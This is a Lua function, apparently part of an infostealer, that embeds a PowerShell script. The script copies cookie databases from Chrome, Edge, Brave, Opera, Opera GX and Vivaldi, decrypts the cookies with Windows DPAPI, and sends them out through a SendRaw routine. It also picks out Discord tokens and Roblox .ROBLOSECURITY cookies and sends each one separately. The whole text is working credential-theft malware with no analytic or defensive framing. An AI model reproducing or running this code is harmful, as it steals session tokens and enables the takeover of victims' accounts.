local function ExtractCookies()
    local ps = [[
        Add-Type -AssemblyName System.Security
        $results = @()
        $browsers = @(
            @{N="Chrome";  P="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"},
            @{N="Edge";    P="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies"},
            @{N="Brave";   P="$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Cookies"},
            @{N="Opera";   P="$env:APPDATA\Opera Software\Opera Stable\Cookies"},
            @{N="OperaGX"; P="$env:APPDATA\Opera Software\Opera GX Stable\Cookies"},
            @{N="Vivaldi"; P="$env:LOCALAPPDATA\Vivaldi\User Data\Default\Cookies"}
        )
        foreach ($b in $browsers) {
            if (Test-Path $b.P) {
                try {
                    $db = $b.P + "._ex"
                    Copy-Item $b.P $db -Force
                    $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$db;Version=3;Read Only=True;")
                    $conn.Open()
                    $cmd = $conn.CreateCommand()
                    $cmd.CommandText = "SELECT host_key, name, encrypted_value FROM cookies"
                    $r = $cmd.ExecuteReader()
                    while ($r.Read()) {
                        $h = $r["host_key"]; $n = $r["name"]; $v = $r["encrypted_value"]
                        if ($v -and $v.Length -gt 0) {
                            try {
                                $bytes = [System.Security.Cryptography.ProtectedData]::Unprotect($v, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
                                $plain = [System.Text.Encoding]::ASCII.GetString($bytes)
                                if ($plain.Length -gt 5) { $results += "$($b.N) | $h | $n | $plain" }
                            } catch {}
                        }
                    }
                    $conn.Close()
                    Remove-Item $db -Force -ErrorAction SilentlyContinue
                } catch {}
            }
        }
        $results -join "`n"
    ]]
    local result = RunPS(ps)
    if result and result ~= "" then
        SendRaw(result, "Decrypted Cookies")
        for line in result:gmatch("[^\n]+") do
            if line:find("discord") then
                local t = line:match("[^|]+$"):gsub("^%s+",""):gsub("%s+$","")
                if #t > 20 then SendRaw(t, "Discord Token") end
            end
            if line:find("ROBLOSECURITY") then
                local c = line:match("[^|]+$"):gsub("^%s+",""):gsub("%s+$","")
                if #c > 20 then SendRaw(c, "Roblox Cookie") end
            end
        end
    end
end

